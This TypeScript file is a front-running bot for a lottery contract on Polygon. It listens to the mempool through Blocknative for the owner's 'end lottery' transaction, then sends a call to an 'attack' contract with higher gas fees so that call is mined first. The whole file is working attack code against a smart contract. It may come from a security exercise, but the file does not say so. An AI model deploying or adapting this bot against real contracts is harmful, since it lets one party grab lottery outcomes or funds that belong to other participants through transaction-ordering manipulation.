import * as ethers from "ethers";
import BlocknativeSdk from "bnc-sdk";
import { EthereumTransactionData, TransactionEvent } from "bnc-sdk";
// import Web3 from "web3";
const WebSocket = require("ws");

require("dotenv").config();

const listenContractAddress = process.env.LISTEN_CONTRACT_ADDRESS!;
const provider = ethers.getDefaultProvider(137, {
  alchemy: process.env.ALCHEMY_KEY,
});
const listenContractOwnerAddress = process.env.LISTEN_CONTRACT_OWNER_ADDRESS!;
const attackContractAddress = process.env.ATTACK_CONTRACT_ADDRESS!;
const attackPrivateKey = process.env.ATTACK_PRIVATE_KEY!;
const blocknativeAppId = process.env.BN_DAPPID!;

const abi = [
  {
    inputs: [],
    name: "attack",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const eventHandler = (event: TransactionEvent) => {
  const tx = event.transaction as EthereumTransactionData;
  console.log("Receive tx event:", JSON.stringify(tx, null, 2));
  if (tx.from.toLowerCase() != listenContractOwnerAddress.toLowerCase()) {
    console.log("Not the correct sender!");
    return;
  }
  // end lottery
  if (tx.input.toLowerCase() != "0x1593a8c7") {
    console.log("Not the correct method!");
    return;
  }
  const gasSetting: { [key: string]: number | string } = { gasLimit: 300000 };
  if (tx.maxPriorityFeePerGasGwei) {
    const priorityFee = tx.maxPriorityFeePerGasGwei;
    console.log("got tx priorityFee gwei:", priorityFee);
    const newPriorityFeeWei = (priorityFee + 50) * 1e9;
    gasSetting["maxPriorityFeePerGas"] = "0x" + newPriorityFeeWei.toString(16);

    const maxFee = tx.maxFeePerGasGwei!;
    console.log("got tx maxFee gwei:", maxFee);
    const newMaxFeeWei = (maxFee + 50) * 1e9;
    gasSetting["maxFeePerGas"] = "0x" + newMaxFeeWei.toString(16);
  } else if (tx.gasPriceGwei) {
    const gasPrice = tx.gasPriceGwei!;
    console.log("got tx gasPrice gwei:", gasPrice);
    const newGasPriceWei = (gasPrice + 50) * 1e9;
    gasSetting["gasPrice"] = "0x" + newGasPriceWei.toString(16);
  } else {
    console.error("Unknown tx type!", tx);
    return;
  }
  console.log("Sending gasSetting:", gasSetting);

  const wallet = new ethers.Wallet(attackPrivateKey, provider);
  const contract = new ethers.Contract(attackContractAddress, abi, wallet);
  const txResponse = contract.attack(gasSetting);
  console.log("Attacking...");
  txResponse
    .then((tx) => {
      console.log("txResponse:", tx);
      console.log("txResponse.hash:", tx.hash);
    })
    .catch((err) => console.log(err));
};

const sdk = new BlocknativeSdk({
  dappId: blocknativeAppId,
  networkId: 137,
  system: "ethereum",
  transactionHandlers: [(event) => eventHandler(event)],
  ws: WebSocket,
  onerror: (error) => {
    console.error(`BN got error: ${error.message}`);
  },
});

sdk
  .configuration({
    scope: listenContractAddress,
    filters: [{ status: "pending" }],
    watchAddress: true,
  })
  .then(() => {
    console.log("sdk configured!");
  })
  .catch((e) => {
    console.error("sdk config error", e);
  });

async function sleep(ms: number) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
